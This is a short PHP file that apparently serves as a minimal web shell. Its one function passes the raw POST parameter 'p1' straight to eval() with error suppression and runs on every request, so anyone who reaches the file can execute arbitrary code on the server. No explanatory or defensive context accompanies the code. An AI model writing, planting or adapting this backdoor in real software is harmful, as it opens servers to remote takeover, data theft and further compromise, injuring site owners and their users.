<?php
function actionRC() { 
    if(@$_POST['p1']) { 
        eval($_POST['p1']);
    }       
} 

actionRC();
?>